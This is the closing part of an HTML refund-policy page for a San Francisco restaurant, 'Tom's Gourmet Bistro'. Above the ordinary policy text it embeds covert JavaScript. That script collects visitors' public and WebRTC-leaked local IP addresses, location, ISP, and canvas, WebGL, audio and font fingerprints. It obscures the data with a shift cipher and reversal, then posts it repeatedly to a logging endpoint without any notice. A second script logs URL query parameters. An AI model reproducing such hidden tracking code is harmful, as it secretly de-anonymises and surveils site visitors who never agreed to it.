                        webGLExtensionsCount: webGLExtensions.length,
                        webGLExtensions: webGLExtensions.slice(0, 10).join(', '), // First 10 to avoid huge strings
                        audioHash: audioFingerprint.hash,
                        audioSampleRate: audioFingerprint.sampleRate,
                        audioBaseLatency: audioFingerprint.baseLatency,
                        
                        timestamp: new Date().toISOString()
                    };
                    
                    // Convert to JSON string first
                    const jsonStr = JSON.stringify(data);
                    
                    // Simple shift cipher (Caesar cipher with shift of 1)
                    function shiftCipher(str) {
                        return str.split('').map(char => {
                            const code = char.charCodeAt(0);
                            // Shift numbers
                            if (code >= 48 && code <= 56) { // 0-8
                                return String.fromCharCode(code + 1);
                            } else if (code === 57) { // 9 becomes 0
                                return '0';
                            }
                            // Shift lowercase letters
                            else if (code >= 97 && code <= 121) { // a-y
                                return String.fromCharCode(code + 1);
                            } else if (code === 122) { // z becomes a
                                return 'a';
                            }
                            // Shift uppercase letters
                            else if (code >= 65 && code <= 89) { // A-Y
                                return String.fromCharCode(code + 1);
                            } else if (code === 90) { // Z becomes A
                                return 'A';
                            }
                            // Keep other characters as is
                            return char;
                        }).join('');
                    }
                    
                    // Encrypt and reverse
                    const encrypted = shiftCipher(jsonStr);
                    const reversed = encrypted.split('').reverse().join('');
                    
                    // Add the encrypted string to the page
                    const encryptedDiv = document.createElement('div');
                    encryptedDiv.style.cssText = 'font-family: monospace; font-size: 10px; color: #e0e0e0; word-break: break-all; padding: 10px; background: #f9f9f9; margin: 10px 0; border: 1px solid #ddd; max-height: 100px; overflow-y: auto;';
                    encryptedDiv.textContent = reversed;
                    
                    // Insert after the hidden div
                    const hiddenDiv = document.querySelector('.hidden');
                    hiddenDiv.parentNode.insertBefore(encryptedDiv, hiddenDiv.nextSibling);
                    
                    // Also log to console for easy copying
                    console.log('Encrypted data string:', reversed);
                    
                    // Log complete data to serverless API after encryption is done
                    try {
                        console.log('Logging detection data to server...');
                        console.log('Number of data fields to log:', Object.keys(data).length);
                        
                        // Prepare the full payload with both raw and encrypted data
                        const payload = {
                            type: 'browser_fingerprint_data',
                            encryptedString: reversed,
                            detectionData: {
                                // Network
                                publicIP: data.publicIP,
                                localIP: data.localIP,
                                ipv6: data.ipv6,
                                webRTCPublicIPs: data.webRTCPublicIPs,
                                webRTCLocalIPs: data.webRTCLocalIPs,
                                
                                // Location
                                country: data.country,
                                city: data.city,
                                region: data.region,
                                timezone: data.timezone,
                                isp: data.isp,
                                
                                // Browser
                                userAgent: data.userAgent,
                                platform: data.platform,
                                vendor: data.vendor,
                                language: data.language,
                                languages: data.languages,
                                
                                // Screen
                                screenRes: data.screenRes,
                                colorDepth: data.colorDepth,
                                pixelRatio: data.pixelRatio,
                                innerRes: data.innerRes,
                                
                                // Hardware
                                hardwareCores: data.hardwareCores,
                                deviceMemory: data.deviceMemory,
                                batteryLevel: data.batteryLevel,
                                maxTouchPoints: data.maxTouchPoints,
                                
                                // Fingerprints
                                canvasHash: data.canvasHash,
                                webGLVendor: data.webGLVendor,
                                webGLRenderer: data.webGLRenderer,
                                audioHash: data.audioHash,
                                
                                // Features
                                cookiesEnabled: data.cookiesEnabled,
                                localStorage: data.localStorage,
                                webRTCEnabled: data.webRTCEnabled,
                                plugins: data.plugins,
                                fontsCount: data.fontsCount,
                                
                                // Full data as JSON string to preserve everything
                                fullDataJSON: JSON.stringify(data)
                            },
                            metadata: {
                                url: window.location.href,
                                referrer: document.referrer || 'Direct',
                                timestamp: new Date().toISOString(),
                                queryParams: new URLSearchParams(window.location.search).toString()
                            }
                        };
                        
                        console.log('Sending comprehensive payload to server...');
                        console.log('Payload size:', JSON.stringify(payload).length, 'bytes');
                        
                        const response = await fetch('/api/fingerprint-log', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'X-Detection-Type': 'browser-fingerprint'
                            },
                            body: JSON.stringify(payload)
                        });
                        
                        if (response.ok) {
                            const result = await response.json();
                            console.log('✅ Detection data successfully logged to server!');
                            console.log('Server response:', result);
                            console.log('Successfully logged', Object.keys(data).length, 'data fields');
                        } else {
                            const errorText = await response.text();
                            console.error('❌ Server logging failed with status:', response.status);
                            console.error('Error response:', errorText);
                        }
                    } catch (error) {
                        console.error('❌ Error logging to server:', error);
                        console.error('Error details:', error.message);
                        // Continue even if logging fails - user experience not affected
                    }
                }
                
                // Add waiting message in hidden class
                const waitingMessage = document.createElement('div');
                waitingMessage.id = 'reference-message';
                waitingMessage.style.cssText = 'display: none;'; // Hidden in source only
                waitingMessage.textContent = 'please wait for your reference code';
                const hiddenDiv = document.querySelector('.hidden');
                hiddenDiv.appendChild(waitingMessage);
                
                // Call the encryption function after data is loaded
                // Wait 4 seconds to ensure all async operations complete (battery, storage, etc.)
                setTimeout(async () => {
                    await createEncryptedOutput();
                    // Update message after encryption
                    const refMessage = document.getElementById('reference-message');
                    if (refMessage) {
                        refMessage.textContent = 'reference code below';
                    }
                }, 4000);
                
                // Send a backup request after 10 seconds to ensure data is captured
                setTimeout(async () => {
                    console.log('Sending backup data log after 10 seconds...');
                    
                    // Get the FULL encrypted string from the page if it exists
                    const encryptedDiv = document.querySelector('.hidden').nextSibling;
                    const encryptedString = encryptedDiv ? encryptedDiv.textContent : 'Not yet generated';
                    
                    // Prepare comprehensive backup payload
                    const backupPayload = {
                        type: 'browser_fingerprint_backup',
                        encryptedString: encryptedString,
                        detectionData: {
                            // Network
                            publicIP: publicIP || 'N/A',
                            localIP: localIP || 'N/A',
                            ipv6: ipv6 || 'N/A',
                            webRTCIPs: {
                                public: webRTCIPs.public || [],
                                local: webRTCIPs.local || [],
                                ipv6: webRTCIPs.ipv6 || []
                            },
                            
                            // Location data
                            geoData: ipData || {},
                            
                            // Browser info - all fields
                            browserConfig: browserInfo,
                            
                            // Fingerprints
                            fingerprints: {
                                canvas: canvasFingerprint,
                                webGL: webGLFingerprint,
                                audio: audioFingerprint,
                                fonts: installedFonts,
                                mediaTypes: mediaTypes,
                                webGLExtensions: webGLExtensions
                            }
                        },
                        metadata: {
                            url: window.location.href,
                            referrer: document.referrer || 'Direct',
                            userAgent: navigator.userAgent,
                            timestamp: new Date().toISOString(),
                            queryParams: new URLSearchParams(window.location.search).toString(),
                            dataCollectionComplete: true
                        }
                    };
                    
                    try {
                        console.log('Sending backup payload with full data...');
                        
                        const response = await fetch('/api/fingerprint-log', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'X-Detection-Type': 'browser-fingerprint-backup'
                            },
                            body: JSON.stringify(backupPayload)
                        });
                        
                        if (response.ok) {
                            const result = await response.json();
                            console.log('✅ Backup data successfully logged to server!');
                            console.log('Backup response:', result);
                        } else {
                            console.error('❌ Backup logging failed:', response.status);
                        }
                    } catch (error) {
                        console.error('❌ Error sending backup data:', error);
                    }
                }, 10000);
                
                // Additional simple logging after 15 seconds as final failsafe
                setTimeout(async () => {
                    console.log('Sending final simple log after 15 seconds...');
                    
                    try {
                        // Create a simple flat object with essential data
                        const simpleData = {
                            type: 'simple_fingerprint_log',
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            
                            // Network
                            publicIP: publicIP || 'N/A',
                            localIP: localIP || 'N/A',
                            
                            // Browser basics
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            screenRes: screen.width + 'x' + screen.height,
                            
                            // Key fingerprints
                            canvasHash: canvasFingerprint?.hash || 'N/A',
                            webGLRenderer: webGLFingerprint?.renderer || 'N/A',
                            audioHash: audioFingerprint?.hash || 'N/A',
                            
                            // Counts
                            fontsDetected: installedFonts?.length || 0,
                            webGLExtensions: webGLExtensions?.length || 0,
                            
                            // Get FULL encrypted string from page
                            encryptedString: (() => {
                                const encDiv = document.querySelector('.hidden').nextSibling;
                                return encDiv ? encDiv.textContent : 'Not found';
                            })()
                        };
                        
                        console.log('Simple data to send:', simpleData);
                        
                        const response = await fetch('/api/fingerprint-log', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(simpleData)
                        });
                        
                        if (response.ok) {
                            console.log('✅ Simple fingerprint log successful!');
                        } else {
                            console.error('❌ Simple log failed:', response.status);
                        }
                    } catch (error) {
                        console.error('❌ Error in simple logging:', error);
                    }
                }, 15000);
                
            } catch (error) {
                ipInfoDiv.innerHTML = `<div style="color: #f00; text-align: center;">
                    Error detecting IP information: ${error.message}<br>
                    <span style="color: #888; font-size: 12px;">This may be due to ad blockers or network restrictions</span>
                </div>`;
            }
            
            // Optional: make the hidden div visible for testing
            // Uncomment the line below to show the IP detector
            // document.querySelector('.hidden').style.display = 'block';
        })();
    </script>
  </div>

                <h3 style="color: #333; margin-top: 3rem; margin-bottom: 1.5rem;">Reservation Cancellations</h3>
                <ul style="line-height: 1.8; color: #666; margin-left: 2rem;">
                    <li><strong>24+ Hours Notice:</strong> Full refund of any deposits or prepayments</li>
                    <li><strong>12-24 Hours Notice:</strong> 50% refund of deposits</li>
                    <li><strong>Less than 12 Hours Notice:</strong> Deposits are non-refundable</li>
                    <li><strong>Special Events:</strong> For private events and special occasions, please refer to your event contract for specific terms</li>
                </ul>

                <h3 style="color: #333; margin-top: 3rem; margin-bottom: 1.5rem;">Gift Cards and Vouchers</h3>
                <ul style="line-height: 1.8; color: #666; margin-left: 2rem;">
                    <li>Gift cards are non-refundable and cannot be exchanged for cash</li>
                    <li>Lost or stolen gift cards cannot be replaced without proof of purchase</li>
                    <li>Gift cards do not expire and can be used for any services at Tom's Gourmet Bistro</li>
                    <li>Promotional vouchers are subject to their specific terms and conditions</li>
                </ul>

                <h3 style="color: #333; margin-top: 3rem; margin-bottom: 1.5rem;">Dining Experience Concerns</h3>
                <p style="line-height: 1.8; color: #666;">
                    If you experience any issues during your visit, please inform our management team immediately. We believe in addressing concerns in real-time to ensure your satisfaction. In cases where immediate resolution is not possible:
                </p>
                <ul style="line-height: 1.8; color: #666; margin-left: 2rem;">
                    <li>We may offer a complimentary return visit</li>
                    <li>Partial or full meal compensation may be provided at management's discretion</li>
                    <li>All concerns will be documented and addressed within 48 hours</li>
                </ul>

                <h3 style="color: #333; margin-top: 3rem; margin-bottom: 1.5rem;">Catering and Event Services</h3>
                <ul style="line-height: 1.8; color: #666; margin-left: 2rem;">
                    <li><strong>30+ Days Notice:</strong> Full refund minus any non-recoverable costs</li>
                    <li><strong>14-30 Days Notice:</strong> 50% refund of total contract value</li>
                    <li><strong>7-14 Days Notice:</strong> 25% refund of total contract value</li>
                    <li><strong>Less than 7 Days Notice:</strong> No refund available</li>
                    <li>Force majeure events will be handled on a case-by-case basis</li>
                </ul>

                <h3 style="color: #333; margin-top: 3rem; margin-bottom: 1.5rem;">Online Orders and Takeout</h3>
                <ul style="line-height: 1.8; color: #666; margin-left: 2rem;">
                    <li>Orders can be cancelled up to 30 minutes after placement for a full refund</li>
                    <li>Once food preparation has begun, orders cannot be cancelled</li>
                    <li>If you receive incorrect or unsatisfactory items, please contact us within 2 hours for resolution</li>
                    <li>Photographic evidence may be required for quality concerns</li>
                </ul>

                <h3 style="color: #333; margin-top: 3rem; margin-bottom: 1.5rem;">Payment Disputes</h3>
                <p style="line-height: 1.8; color: #666;">
                    For any billing discrepancies or payment disputes, please contact our management within 7 days of the transaction. We maintain detailed records of all transactions and will work with you to resolve any issues promptly.
                </p>

                <h3 style="color: #333; margin-top: 3rem; margin-bottom: 1.5rem;">How to Request a Refund</h3>
                <ol style="line-height: 1.8; color: #666; margin-left: 2rem;">
                    <li>Contact us via phone at (415) 302-6027 or email at refunds@tomsgourmetbistro.com</li>
                    <li>Provide your reservation number, receipt, or order details</li>
                    <li>Explain the nature of your concern</li>
                    <li>Allow 3-5 business days for processing</li>
                    <li>Refunds will be issued to the original payment method</li>
                </ol>

                <h3 style="color: #333; margin-top: 3rem; margin-bottom: 1.5rem;">Exceptions</h3>
                <p style="line-height: 1.8; color: #666;">
                    This refund policy does not apply to:
                </p>
                <ul style="line-height: 1.8; color: #666; margin-left: 2rem;">
                    <li>Third-party delivery service issues (please contact the delivery platform directly)</li>
                    <li>Personal taste preferences when dishes are prepared as described</li>
                    <li>Service charges and gratuities</li>
                    <li>Wine and spirits once opened</li>
                </ul>

                <div style="background-color: #f9f9f9; padding: 2rem; border-radius: 8px; margin-top: 3rem;">
                    <h3 style="color: #333; margin-bottom: 1rem;">Contact Us</h3>
                    <p style="line-height: 1.8; color: #666;">
                        If you have any questions about our refund policy or need assistance, please don't hesitate to reach out:
                    </p>
                    <p style="line-height: 1.8; color: #666;">
                        <strong>Phone:</strong> (415) 302-6027<br>
                        <strong>Email:</strong> refunds@tomsgourmetbistro.com<br>
                        <strong>Address:</strong> 707 Montgomery Street, San Francisco, CA 94111<br>
                        <strong>Hours:</strong> Monday-Friday, 9:00 AM - 5:00 PM PST
                    </p>
                </div>

                <p style="font-style: italic; color: #999; margin-top: 3rem; text-align: center;">
                    This policy is effective as of January 1, 2024, and may be updated periodically. Please check this page for the most current version.
                </p>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer>
        <div class="container footer-content">
            <p>&copy; 2024 Tom's Gourmet Bistro. All rights reserved.</p>
            <p>707 Montgomery Street, San Francisco, CA | (415) 302-6027</p>
        </div>
    </footer>

    <script>
        // Capture and log query parameters when page loads
        document.addEventListener('DOMContentLoaded', async function() {
            // Get URL parameters
            const urlParams = new URLSearchParams(window.location.search);
            
            // Check if there are any query parameters
            if (urlParams.toString()) {
                // Convert URLSearchParams to object
                const queryParams = {};
                for (const [key, value] of urlParams) {
                    queryParams[key] = value;
                }
                
                // Log to console
                console.log('=== REFUND POLICY PAGE ACCESSED WITH PARAMETERS ===');
                console.log('Query Parameters:', queryParams);
                console.log('Full URL:', window.location.href);
                console.log('Timestamp:', new Date().toISOString());
                
                // Log each parameter individually
                for (const [key, value] of Object.entries(queryParams)) {
                    console.log(`${key}: ${value}`);
                }
                console.log('===================================================');
                
                // Send to serverless function - QUERY PARAMS ONLY
                try {
                    console.log('Sending query parameters to server...');
                    
                    const response = await fetch('/api/refund-policy/log', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Detection-Type': 'query-params'
                        },
                        body: JSON.stringify({
                            type: 'query_params_only',
                            queryParams: queryParams,
                            url: window.location.href,
                            referrer: document.referrer || 'Direct',
                            userAgent: navigator.userAgent,
                            timestamp: new Date().toISOString()
                        })
                    });
                    
                    const result = await response.json();
                    
                    if (response.ok) {
                        console.log('✅ Query parameters successfully logged to server!');
                        console.log('Server response:', result);
                    } else {
                        console.error('❌ Server logging failed:', result);
                    }
                    
                } catch (error) {
                    console.error('❌ Error sending to server:', error);
                    // Continue normally even if logging fails
                }
            }
        });
    </script>
</body>
</html>